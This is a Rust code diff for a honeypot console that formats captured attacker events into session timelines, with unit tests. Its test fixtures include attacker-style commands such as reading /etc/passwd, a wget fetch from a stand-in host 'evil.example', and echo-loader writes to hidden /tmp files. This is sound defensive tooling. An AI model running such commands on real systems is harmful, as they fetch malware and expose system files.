+        .then(|| metadata.get("suppressed_count")?.as_u64())
+        .flatten()
+}
+
+/// Signal-type-dependent extraction of the single most useful `metadata` field for the evidence
+/// timeline's "Detail" column - `internal/design/11-console-forensics.md`'s "Detail column
+/// extraction by signal type" table. `pub(crate)` because `routes::search` (console-forensics
+/// task 5) reuses it verbatim for the same column in event search results.
+pub(crate) fn extract_detail(signal_type: &str, metadata: &serde_json::Value) -> String {
+    // A sensor's per-source summary stands for the events its budget kept out of the log.
+    if matches!(
+        signal_type,
+        "honeypot_login_attempt" | "honeypot_connection"
+    ) && let Some(n) = summary_events(metadata)
+    {
+        return format!("{n} events summarized");
+    }
+    match signal_type {
+        // Prefer the de-obfuscated command when the sensor recovered one (an XOR-encoded probe), so
+        // the timeline reads `enable` rather than `lghkel`; the raw form stays in the raw expander.
+        "honeypot_command_exec" => metadata
+            .get("command_decoded")
+            .or_else(|| metadata.get("command"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("-")
+            .to_string(),
+        "honeypot_login_attempt" => metadata
+            .get("username")
+            .and_then(|v| v.as_str())
+            .map(|u| format!("user: {u}"))
+            .unwrap_or_else(|| "-".into()),
+        "honeypot_malware_upload" => {
+            // A body the sensor's spool refused is emitted with no `sample`, so intake adds no
+            // `sample_*` keys; the sensor puts the same facts under the bare names, with
+            // `stored: false` and the reason. Read those so the row still names what was seen.
+            let not_stored = metadata.get("stored").and_then(|v| v.as_bool()) == Some(false);
+            let text = |sample_key: &str, bare_key: &str| {
+                metadata
+                    .get(sample_key)
+                    .or_else(|| not_stored.then(|| metadata.get(bare_key)).flatten())
+                    .and_then(|v| v.as_str())
+            };
+            let name = text("sample_orig_name", "orig_name").unwrap_or("unknown");
+            let sha = text("sample_sha256", "sha256")
+                .map(|s| &s[..s.len().min(12)])
+                .unwrap_or("?");
+            let size = metadata
+                .get("sample_size")
+                .or_else(|| not_stored.then(|| metadata.get("size")).flatten())
+                .and_then(|v| v.as_u64())
+                .map(format_bytes)
+                .unwrap_or_default();
+            if not_stored {
+                let reason = metadata
+                    .get("not_stored_reason")
+                    .and_then(|v| v.as_str())
+                    .unwrap_or("unknown")
+                    .replace('_', " ");
+                format!("{name} ({sha}..., {size}, not stored: {reason})")
+            } else {
+                format!("{name} ({sha}..., {size})")
+            }
+        }
+        "honeypot_file_download" => metadata
+            .get("url")
+            .or_else(|| metadata.get("command"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("-")
+            .to_string(),
+        "honeypot_connection" => metadata
+            .get("protocol_label")
+            .and_then(|v| v.as_str())
+            .unwrap_or("-")
+            .to_string(),
+        // `local_port` is the arrival port the sensor framework stamps on every event
+        // (`sensor_framework::arrival`); the catch-all binds many ports, so it is what tells
+        // its probes apart. No sensor has ever written a `port` key.
+        //
+        // A session-based sensor (telnet) that recognised the protocol a scanner spoke to its
+        // port names it (`probe_protocol`), so the row reads "tls, port 23".
+        "catchall_probe" => metadata
+            .get("local_port")
+            .and_then(|v| v.as_u64())
+            .map(|p| {
+                match metadata
+                    .get("probe_protocol")
+                    .and_then(|v| v.as_str())
+                    .filter(|s| !s.is_empty())
+                {
+                    Some(protocol) => format!("{protocol}, port {p}"),
+                    None => format!("port {p}"),
+                }
+            })
+            .unwrap_or_else(|| "-".into()),
+        _ => metadata
+            .as_object()
+            .and_then(|m| {
+                m.iter()
+                    .find(|(k, _)| k.as_str() != "protocol_label")
+                    .map(|(k, v)| format!("{k}: {v}"))
+            })
+            .unwrap_or_else(|| "-".into()),
+    }
+}
+
+/// Human-readable elapsed time for a session card's duration (`12s`, `3m05s`, `1h02m`).
+fn format_duration(d: chrono::Duration) -> String {
+    let total_secs = d.num_seconds().max(0);
+    if total_secs < 60 {
+        format!("{total_secs}s")
+    } else if total_secs < 3600 {
+        format!("{}m{:02}s", total_secs / 60, total_secs % 60)
+    } else {
+        format!("{}h{:02}m", total_secs / 3600, (total_secs % 3600) / 60)
+    }
+}
+
+/// Splits the flat, newest-first `all_events` into per-`session_id` [`SessionGroup`]s (each
+/// sorted oldest-first, so a card reads top-to-bottom as the connection unfolded) plus an
+/// "Ungrouped events" tail for rows with no `session_id` (pre-existing data from before this
+/// column existed - `internal/design/11-console-forensics.md`'s "degrade gracefully"). Groups are
+/// then ordered most-recent-session-first, and the `recent_expanded` newest get `expanded: true`
+/// so the operator lands on an already-open view of current activity rather than a wall of
+/// collapsed cards.
+fn group_into_sessions(
+    rows: Vec<EventRow>,
+    recent_expanded: usize,
+) -> (Vec<SessionGroup>, Vec<EventRow>) {
+    let mut sessions: BTreeMap<String, Vec<EventRow>> = BTreeMap::new();
+    let mut ungrouped = Vec::new();
+
+    for row in rows {
+        match row.session_id.clone() {
+            Some(sid) => sessions.entry(sid).or_default().push(row),
+            None => ungrouped.push(row),
+        }
+    }
+
+    let mut groups: Vec<SessionGroup> = sessions
+        .into_iter()
+        .map(|(session_id, mut events)| {
+            events.sort_by_key(|e| e.raw_observed_at);
+
+            // `events` is never empty here - every group came from `.entry(sid).or_default()`
+            // being pushed into at least once, so these two endpoints always exist.
+            let start = events[0].raw_observed_at;
+            let end = events[events.len() - 1].raw_observed_at;
+
+            let username = events
+                .iter()
+                .find(|e| e.signal_type_raw == "honeypot_login_attempt")
+                .and_then(|e| e.metadata.get("username"))
+                .and_then(|v| v.as_str())
+                .unwrap_or_default()
+                .to_string();
+            let commands: Vec<String> = events
+                .iter()
+                .filter(|e| e.signal_type_raw == "honeypot_command_exec")
+                .map(|e| e.detail.clone())
+                .collect();
+
+            SessionGroup {
+                session_id,
+                start_time: events[0].observed_at.clone(),
+                start_relative: events[0].relative_time.clone(),
+                duration: format_duration(end - start),
+                sensor: format_sensor_label(&events[0].sensor_raw),
+                protocol: events[0].protocol.clone(),
+                username,
+                command_count: commands.len(),
+                event_count: events.len(),
+                end_time: end,
+                items: timeline_items(&events),
+                events,
+                expanded: false,
+                tags: Vec::new(),
+                commands,
+            }
+        })
+        .collect();
+
+    // Most-recent-first by session END (latest `observed_at` in the group) -
+    // `internal/design/11-console-forensics.md`'s "Order sessions by most recent first (latest
+    // `observed_at` in each group)", not by when each session started.
+    groups.sort_by_key(|g| std::cmp::Reverse(g.end_time));
+    for (i, g) in groups.iter_mut().enumerate() {
+        g.expanded = i < recent_expanded;
+    }
+    (groups, ungrouped)
+}
+
+/// The echo-loader chunk a command event wrote: the file and the chunk's number.
+fn chunk_of(event: &EventRow) -> Option<(&str, u64)> {
+    if event.signal_type_raw != "honeypot_command_exec" {
+        return None;
+    }
+    Some((
+        event.metadata.get("assembled_file")?.as_str()?,
+        event.metadata.get("chunk_index")?.as_u64()?,
+    ))
+}
+
+/// Lists a session's events (oldest first) as card rows: each event its own row, except that two
+/// or more consecutive chunk writes to the same file become one row. Only adjacent chunks join,
+/// so anything the loader ran between two chunks still shows where it happened.
+fn timeline_items(events: &[EventRow]) -> Vec<TimelineItem> {
+    let mut items: Vec<TimelineItem> = Vec::new();
+    for (i, event) in events.iter().enumerate() {
+        let chunk = chunk_of(event);
+        if let (Some((file, index)), Some(last)) = (chunk, items.last_mut())
+            && chunk_of(&events[last.end - 1]).is_some_and(|(f, _)| f == file)
+        {
+            last.end = i + 1;
+            last.chunk_file = Some(file.to_string());
+            last.last_chunk = index;
+            continue;
+        }
+        items.push(TimelineItem {
+            start: i,
+            end: i + 1,
+            chunk_file: None,
+            first_chunk: chunk.map_or(0, |(_, n)| n),
+            last_chunk: chunk.map_or(0, |(_, n)| n),
+        });
+    }
+    items
+}
+
+/// Folds consecutive sessions (newest first, as [`group_into_sessions`] orders them) from one
+/// sensor that ran the same, non-empty command sequence. A session that ran no commands never
+/// folds: two bare logins with different credentials are two attempts worth seeing.
+fn fold_repeated_sessions(groups: Vec<SessionGroup>) -> Vec<SessionFold> {
+    let mut folds: Vec<Vec<SessionGroup>> = Vec::new();
+    for group in groups {
+        if let Some(run) = folds.last_mut()
+            && let Some(prev) = run.last()
+            && !group.commands.is_empty()
+            && prev.sensor == group.sensor
+            && prev.commands == group.commands
+        {
+            run.push(group);
+            continue;
+        }
+        folds.push(vec![group]);
+    }
+    folds
+        .into_iter()
+        .map(|sessions| {
+            let mut users: Vec<String> = Vec::new();
+            for s in sessions.iter().rev() {
+                if !s.username.is_empty() && !users.contains(&s.username) {
+                    users.push(s.username.clone());
+                }
+            }
+            let newest = &sessions[0];
+            let oldest = &sessions[sessions.len() - 1];
+            SessionFold {
+                repeat: sessions.len(),
+                users,
+                first_start: oldest.start_time.clone(),
+                latest_relative: newest.start_relative.clone(),
+                sensor: newest.sensor.clone(),
+                protocol: newest.protocol.clone(),
+                command_count: newest.command_count,
+                expanded: newest.expanded,
+                sessions,
+            }
+        })
+        .collect()
+}
+
+/// `IpAddr::to_string()`/`Display` can only ever produce digits, `.`, and `:` - never an HTML
+/// metacharacter - so interpolating it directly into a literal string here is safe by
+/// construction, the same reasoning `routes::error`'s static `GENERIC_BODY` relies on for having
+/// no interpolation at all.
+fn not_found_body(ip: IpAddr) -> Html<String> {
+    Html(format!(
+        "<!doctype html><meta charset=\"utf-8\"><title>IP not found</title>\
+         <link rel=\"stylesheet\" href=\"/assets/console.css\">\
+         <p class=\"message-page\">No score projection found for {ip}. \
+         It may not have been scored yet, or the IP was mistyped.</p>"
+    ))
+}
+
+#[cfg(test)]
+mod tests {
+    use chrono::Duration;
+    use serde_json::json;
+
+    use super::*;
+
+    /// Builds a minimal `EventRow` fixture. Every caller overrides only the fields its test
+    /// actually exercises, so a change to an unrelated field never touches every test in the
+    /// module - the same shape as `sensor-catchall`'s own `build_event` test fixtures.
+    fn event_row(
+        session_id: Option<&str>,
+        signal_type: &str,
+        seconds_ago: i64,
+        metadata: serde_json::Value,
+    ) -> EventRow {
+        let observed_at = Utc::now() - Duration::seconds(seconds_ago);
+        EventRow {
+            id: 1,
+            observed_at: format_timestamp(observed_at),
+            relative_time: format_relative_time(observed_at),
+            activity: format_activity("ssh", signal_type),
+            detail: extract_detail(signal_type, &metadata),
+            xor_badge: None,
+            lines: Vec::new(),
+            lines_truncated: false,
+            reply: None,
+            fetch: None,
+            protocol: "TCP".into(),
+            authenticated: true,
+            wan_ip: "203.0.113.9".into(),
+            metadata_json: metadata.to_string(),
+            session_id: session_id.map(str::to_string),
+            raw_observed_at: observed_at,
+            sensor_raw: "ssh".into(),
+            signal_type_raw: signal_type.into(),
+            metadata,
+        }
+    }
+
+    #[test]
+    fn extract_detail_command_exec_reads_command_field() {
+        let metadata = json!({ "command": "cat /etc/passwd" });
+        assert_eq!(
+            extract_detail("honeypot_command_exec", &metadata),
+            "cat /etc/passwd"
+        );
+    }
+
+    #[test]
+    fn service_label_maps_known_sensors_and_falls_back_to_raw() {
+        assert_eq!(service_label("cred-vnc"), "VNC (5900)");
+        assert_eq!(service_label("ssh"), "SSH (22)");
+        assert_eq!(service_label("tftp"), "TFTP (69/udp)");
+        assert_eq!(service_label("mqtt"), "MQTT (1883)");
+        assert_eq!(service_label("dns"), "DNS (53)");
+        assert_eq!(service_label("catchall"), "Catch-all (port scan)");
+        // An unknown/renamed sensor is never dropped - it shows its raw name.
+        assert_eq!(service_label("some-future-sensor"), "some-future-sensor");
+    }
+
+    #[test]
+    fn external_lookup_links_build_per_vendor_urls_for_the_ip() {
+        let ip: IpAddr = "203.0.113.7".parse().unwrap();
+        let links = external_lookup_links(ip);
+        let by: std::collections::HashMap<_, _> = links
+            .iter()
+            .map(|l| (l.name.as_str(), l.url.as_str()))
+            .collect();
+        assert_eq!(by["Shodan"], "https://www.shodan.io/host/203.0.113.7");
+        assert_eq!(by["GreyNoise"], "https://viz.greynoise.io/ip/203.0.113.7");
+        assert_eq!(
+            by["AbuseIPDB"],
+            "https://www.abuseipdb.com/check/203.0.113.7"
+        );
+        assert_eq!(
+            by["VirusTotal"],
+            "https://www.virustotal.com/gui/ip-address/203.0.113.7"
+        );
+    }
+
+    #[test]
+    fn extract_detail_command_exec_prefers_decoded_over_raw() {
+        // When the sensor recovered an XOR-obfuscated probe, the timeline shows the decoded form;
+        // the raw (still-obfuscated) bytes remain in `command` for the raw expander and hash chain.
+        let metadata = json!({ "command": "lghkel", "command_decoded": "enable" });
+        assert_eq!(extract_detail("honeypot_command_exec", &metadata), "enable");
+    }
+
+    #[test]
+    fn extract_detail_login_attempt_prefixes_username() {
+        let metadata = json!({ "username": "root" });
+        assert_eq!(
+            extract_detail("honeypot_login_attempt", &metadata),
+            "user: root"
+        );
+    }
+
+    #[test]
+    fn extract_detail_names_the_events_a_summary_stands_for() {
+        let summary = json!({ "event_summary": true, "suppressed_count": 580u64 });
+        for signal in ["honeypot_login_attempt", "honeypot_connection"] {
+            assert_eq!(extract_detail(signal, &summary), "580 events summarized");
+        }
+        // Without the marker the count means nothing here.
+        let plain = json!({ "suppressed_count": 580u64, "username": "root" });
+        assert_eq!(
+            extract_detail("honeypot_login_attempt", &plain),
+            "user: root"
+        );
+    }
+
+    #[test]
+    fn extract_detail_malware_upload_truncates_sha_and_formats_size() {
+        let metadata = json!({
+            "sample_orig_name": "payload.sh",
+            "sample_sha256": "a1b2c3d4e5f6a7b8c9d0",
+            "sample_size": 4300u64,
+        });
+        assert_eq!(
+            extract_detail("honeypot_malware_upload", &metadata),
+            "payload.sh (a1b2c3d4e5f6..., 4.2 KB)"
+        );
+    }
+
+    #[test]
+    fn extract_detail_not_stored_upload_names_what_was_seen_and_why_it_was_not_kept() {
+        // The exact metadata a sensor emits for a body its full spool refused: no `sample_*`
+        // keys, the facts under the bare names.
+        let metadata = json!({
+            "orig_name": "sensors/temp",
+            "sha256": "a1b2c3d4e5f6a7b8c9d0",
+            "size": 4300u64,
+            "stored": false,
+            "not_stored_reason": "spool_full",
+        });
+        assert_eq!(
+            extract_detail("honeypot_malware_upload", &metadata),
+            "sensors/temp (a1b2c3d4e5f6..., 4.2 KB, not stored: spool full)"
+        );
+    }
+
+    #[test]
+    fn extract_detail_stored_upload_ignores_bare_keys() {
+        // `sha256` alone (no `stored: false`) is the stored row's own digest of the same body;
+        // the `sample_*` keys stay authoritative and the fallback must not fire.
+        let metadata = json!({ "sha256": "ffffffffffffffff", "size": 1u64 });
+        assert_eq!(
+            extract_detail("honeypot_malware_upload", &metadata),
+            "unknown (?..., )"
+        );
+    }
+
+    #[test]
+    fn extract_detail_malware_upload_missing_fields_falls_back() {
+        let metadata = json!({});
+        assert_eq!(
+            extract_detail("honeypot_malware_upload", &metadata),
+            "unknown (?..., )"
+        );
+    }
+
+    #[test]
+    fn extract_detail_file_download_prefers_url_over_command() {
+        let metadata = json!({ "url": "http://evil.example/bot", "command": "wget" });
+        assert_eq!(
+            extract_detail("honeypot_file_download", &metadata),
+            "http://evil.example/bot"
+        );
+    }
+
+    #[test]
+    fn extract_detail_file_download_falls_back_to_command() {
+        let metadata = json!({ "command": "wget http://evil.example/bot" });
+        assert_eq!(
+            extract_detail("honeypot_file_download", &metadata),
+            "wget http://evil.example/bot"
+        );
+    }
+
+    #[test]
+    fn extract_detail_connection_reads_protocol_label() {
+        let metadata = json!({ "protocol_label": "ssh" });
+        assert_eq!(extract_detail("honeypot_connection", &metadata), "ssh");
+    }
+
+    #[test]
+    fn extract_detail_catchall_probe_reads_the_stamped_local_port() {
+        let metadata = json!({ "payload_hex": "", "observed_len": 0, "local_port": 8080 });
+        assert_eq!(extract_detail("catchall_probe", &metadata), "port 8080");
+        // `port` is not a key any sensor writes; reading it would be a second key for one fact.
+        let stray = json!({ "payload_hex": "", "observed_len": 0, "port": 8080 });
+        assert_eq!(extract_detail("catchall_probe", &stray), "-");
+    }
+
+    #[test]
+    fn extract_detail_catchall_probe_names_the_protocol_a_sensor_recognised() {
+        let metadata = json!({ "probe_protocol": "tls", "local_port": 23 });
+        assert_eq!(extract_detail("catchall_probe", &metadata), "tls, port 23");
+        let blank = json!({ "probe_protocol": "", "local_port": 23 });
+        assert_eq!(extract_detail("catchall_probe", &blank), "port 23");
+    }
+
+    #[test]
+    fn extract_detail_catchall_probe_missing_port_falls_back_to_dash() {
+        let metadata = json!({ "payload_hex": "deadbeef", "observed_len": 4 });
+        assert_eq!(extract_detail("catchall_probe", &metadata), "-");
+    }
+
+    #[test]
+    fn extract_detail_unknown_signal_skips_protocol_label() {
+        let metadata = json!({ "protocol_label": "redis", "note": "unusual" });
+        assert_eq!(
+            extract_detail("some_future_signal", &metadata),
+            "note: \"unusual\""
+        );
+    }
+
+    #[test]
+    fn extract_detail_unknown_signal_with_only_protocol_label_falls_back_to_dash() {
+        let metadata = json!({ "protocol_label": "redis" });
+        assert_eq!(extract_detail("some_future_signal", &metadata), "-");
+    }
+
+    #[test]
+    fn signal_type_snake_converts_pascal_case() {
+        assert_eq!(
+            signal_type_snake(SignalType::HoneypotCommandExec),
+            "honeypot_command_exec"
+        );
+        assert_eq!(
+            signal_type_snake(SignalType::CatchallProbe),
+            "catchall_probe"
+        );
+    }
+
+    #[test]
+    fn format_duration_picks_the_right_unit() {
+        assert_eq!(format_duration(Duration::seconds(42)), "42s");
+        assert_eq!(format_duration(Duration::seconds(185)), "3m05s");
+        assert_eq!(format_duration(Duration::seconds(3725)), "1h02m");
+    }
+
+    #[test]
+    fn group_into_sessions_separates_grouped_from_ungrouped() {
+        let rows = vec![
+            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
+            event_row(
+                None,
+                "honeypot_login_attempt",
+                90,
+                json!({ "username": "admin" }),
+            ),
+        ];
+        let (groups, ungrouped) = group_into_sessions(rows, 3);
+        assert_eq!(groups.len(), 1);
+        assert_eq!(ungrouped.len(), 1);
+        assert_eq!(groups[0].session_id, "sess-a");
+    }
+
+    #[test]
+    fn group_into_sessions_derives_username_and_command_count() {
+        let rows = vec![
+            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
+            event_row(
+                Some("sess-a"),
+                "honeypot_login_attempt",
+                90,
+                json!({ "username": "root" }),
+            ),
+            event_row(
+                Some("sess-a"),
+                "honeypot_command_exec",
+                80,
+                json!({ "command": "whoami" }),
+            ),
+            event_row(
+                Some("sess-a"),
+                "honeypot_command_exec",
+                70,
+                json!({ "command": "id" }),
+            ),
+        ];
+        let (groups, _) = group_into_sessions(rows, 3);
+        assert_eq!(groups.len(), 1);
+        assert_eq!(groups[0].username, "root");
+        assert_eq!(groups[0].command_count, 2);
+        assert_eq!(groups[0].event_count, 4);
+    }
+
+    #[test]
+    fn group_into_sessions_orders_events_within_a_session_oldest_first() {
+        let rows = vec![
+            event_row(
+                Some("sess-a"),
+                "honeypot_command_exec",
+                10,
+                json!({ "command": "b" }),
+            ),
+            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
+            event_row(
+                Some("sess-a"),
+                "honeypot_command_exec",
+                50,
+                json!({ "command": "a" }),
+            ),
+        ];
+        let (groups, _) = group_into_sessions(rows, 3);
+        let activities: Vec<&str> = groups[0].events.iter().map(|e| e.detail.as_str()).collect();
+        assert_eq!(activities, vec!["-", "a", "b"]);
+    }
+
+    #[test]
+    fn group_into_sessions_orders_sessions_most_recent_first_and_expands_only_the_newest() {
+        let rows = vec![
+            event_row(Some("sess-old"), "honeypot_connection", 1000, json!({})),
+            event_row(Some("sess-mid"), "honeypot_connection", 500, json!({})),
+            event_row(Some("sess-new"), "honeypot_connection", 10, json!({})),
+        ];
+        let (groups, _) = group_into_sessions(rows, 2);
+        let ids: Vec<&str> = groups.iter().map(|g| g.session_id.as_str()).collect();
+        assert_eq!(ids, vec!["sess-new", "sess-mid", "sess-old"]);
+        assert!(groups[0].expanded);
+        assert!(groups[1].expanded);
+        assert!(!groups[2].expanded);
+    }
+
+    #[test]
+    fn group_into_sessions_orders_by_end_time_not_start_time() {
+        // "sess-long" starts long before "sess-short" but is still running: its last event is
+        // more recent than "sess-short"'s. Sorting by `start_time` (the bug) would put
+        // "sess-short" first, since it started more recently even though it ended earlier -
+        // sorting by `end_time` (the design spec's "latest observed_at in each group") puts
+        // "sess-long" first instead.
+        let rows = vec![
+            event_row(Some("sess-long"), "honeypot_connection", 500, json!({})),
+            event_row(
+                Some("sess-long"),
+                "honeypot_command_exec",
+                50,
+                json!({ "command": "id" }),
+            ),
+            event_row(Some("sess-short"), "honeypot_connection", 100, json!({})),
+            event_row(
+                Some("sess-short"),
+                "honeypot_command_exec",
+                90,
+                json!({ "command": "id" }),
+            ),
+        ];
+        let (groups, _) = group_into_sessions(rows, 3);
+        let ids: Vec<&str> = groups.iter().map(|g| g.session_id.as_str()).collect();
+        assert_eq!(ids, vec!["sess-long", "sess-short"]);
+    }
+
+    #[test]
+    fn group_into_sessions_with_no_sessions_returns_empty_groups() {
+        let rows = vec![event_row(
+            None,
+            "catchall_probe",
+            5,
+            json!({ "local_port": 22 }),
+        )];
+        let (groups, ungrouped) = group_into_sessions(rows, 3);
+        assert!(groups.is_empty());
+        assert_eq!(ungrouped.len(), 1);
+    }
+
+    fn command(sid: &str, ago: i64, command: &str) -> EventRow {
+        event_row(
+            Some(sid),
+            "honeypot_command_exec",
+            ago,
+            json!({ "command": command }),
+        )
+    }
+
+    fn chunk(sid: &str, ago: i64, file: &str, index: u64) -> EventRow {
+        event_row(
+            Some(sid),
+            "honeypot_command_exec",
+            ago,
+            json!({ "command": format!("echo -ne '\\x7f' >> {file}"), "assembled_file": file, "chunk_index": index }),
+        )
+    }
+
+    #[test]
+    fn only_adjacent_chunk_writes_to_one_file_share_a_row() {
+        let rows = vec![
+            command("s", 100, "enable"),
+            chunk("s", 99, "/tmp/.i", 1),
+            chunk("s", 98, "/tmp/.i", 2),
+            chunk("s", 97, "/tmp/.i", 3),
+            command("s", 96, "chmod 777 .i"),
+            chunk("s", 95, "/tmp/.j", 1),
+            chunk("s", 94, "/tmp/.i", 4),
+        ];
+        let (groups, _) = group_into_sessions(rows, 1);
+        let shape: Vec<(usize, Option<&str>, u64, u64)> = groups[0]
+            .items
+            .iter()
+            .map(|i| {
+                (
+                    i.end - i.start,
+                    i.chunk_file.as_deref(),
+                    i.first_chunk,
+                    i.last_chunk,
+                )
+            })
+            .collect();
+        assert_eq!(
+            shape,
+            [
+                (1, None, 0, 0),
+                (3, Some("/tmp/.i"), 1, 3),
+                (1, None, 0, 0),
+                (1, None, 1, 1),
+                (1, None, 4, 4),
+            ]
+        );
+    }
+
+    #[test]
+    fn only_adjacent_sessions_with_the_same_commands_fold() {
+        let login = |sid: &str, ago: i64, user: &str| {
+            event_row(
+                Some(sid),
+                "honeypot_login_attempt",
+                ago,
+                json!({ "username": user }),
+            )
+        };
+        // Newest first once grouped: s1 s2 run "a b", s3 runs "a c", s4 "a b" again, s5 and s6
+        // run nothing.
+        let rows = vec![
+            login("s1", 100, "cht"),
+            command("s1", 99, "a"),
+            command("s1", 98, "b"),
+            login("s2", 200, "admin"),
+            command("s2", 199, "a"),
+            command("s2", 198, "b"),
+            command("s3", 300, "a"),
+            command("s3", 299, "c"),
+            command("s4", 400, "a"),
+            command("s4", 399, "b"),
+            login("s5", 500, "root"),
+            login("s6", 600, "root"),
+        ];
+        let (groups, _) = group_into_sessions(rows, 1);
+
+        let folds = fold_repeated_sessions(groups);
+
+        let shape: Vec<usize> = folds.iter().map(|f| f.repeat).collect();
+        assert_eq!(shape, [2, 1, 1, 1, 1]);
+        assert_eq!(folds[0].users, ["admin", "cht"]);
+        assert_eq!(folds[0].command_count, 2);
+        assert!(
+            folds[0].expanded,
+            "the newest fold opens like the newest card"
+        );
+        assert_eq!(folds[0].sessions[0].session_id, "s1");
+    }
+
+    #[test]
+    fn format_cursor_round_trips_through_parse_cursor() {
+        let observed_at = Utc::now() - Duration::seconds(12345);
+        let cursor = format_cursor(observed_at, 987);
+        let (parsed_time, parsed_id) = parse_cursor(&cursor).expect("cursor should parse");
+        // `to_rfc3339_opts` with `Micros` truncates below microsecond precision; `Utc::now()`
+        // itself is already sub-microsecond in practice on every platform this runs on, so a
+        // microsecond-level round-trip comparison is exact, not approximate.
+        assert_eq!(
+            parsed_time.timestamp_micros(),
+            observed_at.timestamp_micros()
+        );
+        assert_eq!(parsed_id, 987);
+    }
+
+    #[test]
+    fn format_cursor_never_emits_a_plus_sign() {
+        // A `+00:00` UTC offset (chrono's default `to_rfc3339` form) would decode as a literal
+        // space through axum's `application/x-www-form-urlencoded` `Query` extractor - see
+        // `format_cursor`'s doc comment. The forced `Z` suffix must never regress to `+00:00`.
+        let cursor = format_cursor(Utc::now(), 1);
+        assert!(
+            !cursor.contains('+'),
+            "cursor must not contain '+': {cursor}"
+        );
+        assert!(
+            cursor.ends_with("Z,1"),
+            "cursor must end in Z,<id>: {cursor}"
+        );
+    }
+
+    #[test]
+    fn parse_cursor_rejects_malformed_input() {
+        assert!(parse_cursor("not-a-timestamp,12").is_none());
+        assert!(parse_cursor("2026-01-01T00:00:00Z").is_none()); // missing ",<id>"
+        assert!(parse_cursor("2026-01-01T00:00:00Z,not-an-id").is_none());
+        assert!(parse_cursor("").is_none());
+    }
+
+    #[test]
+    fn normalize_detail_range_accepts_known_values_and_defaults_to_7d() {
+        assert_eq!(normalize_detail_range(Some("24h")), "24h");
+        assert_eq!(normalize_detail_range(Some("7d")), "7d");
+        assert_eq!(normalize_detail_range(Some("30d")), "30d");
+        assert_eq!(normalize_detail_range(Some("bogus")), "7d");
+        assert_eq!(normalize_detail_range(None), "7d");
+    }
+}
